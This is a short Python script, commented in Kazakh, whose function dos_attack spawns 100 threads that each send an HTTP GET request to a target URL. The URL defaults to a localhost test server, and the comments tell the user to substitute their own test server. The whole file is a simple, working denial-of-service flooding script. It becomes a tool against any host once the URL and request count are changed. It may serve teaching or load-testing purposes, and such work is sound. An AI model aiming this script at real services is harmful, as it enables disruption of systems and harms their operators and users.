import requests
import threading

# Нысан URL (Тест серверін пайдаланыңыз)
TARGET_URL = "http://127.0.0.1:5000"  # Тест серверіңізге ауыстырыңыз
NUM_REQUESTS = 100  # Жіберілетін сұраныстар саны

def send_request():
    try:
        response = requests.get(TARGET_URL)
        print(f"Сұраныс жіберілді, Жауап: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Сұраныс сәтсіз аяқталды: {e}")

def dos_attack():
    threads = []
    for _ in range(NUM_REQUESTS):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    dos_attack()